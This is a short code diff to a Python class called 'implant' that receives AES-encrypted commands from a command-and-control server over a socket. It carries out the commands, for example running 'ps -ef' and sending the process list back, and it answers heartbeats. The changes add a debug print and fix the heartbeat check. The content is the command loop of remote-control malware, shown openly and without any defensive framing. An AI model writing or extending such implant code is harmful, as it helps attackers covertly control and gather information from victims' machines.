@@ -63,7 +63,9 @@ class implant:
             data_len = self.sock.recv(8)
             data = self.sock.recv(int(data_len.decode()))
             aes = C2_AES(self.aes_secret)
+            print(data)
             data = aes.decrypt(data)
+            
             data = json.loads(data)
             print(f"Recieved {data['command']}")
             if data['command'] == "test":
@@ -76,7 +78,7 @@ class implant:
             elif data['command'] == "ps":
                 data = subprocess.check_output(['ps', '-ef'])
                 self.send_msg(data.decode())
-            elif data.decode() == "heartbeat":
+            elif data['command'] == "heartbeat":
                 self.send_msg("im alive")
 
     def intro(self):
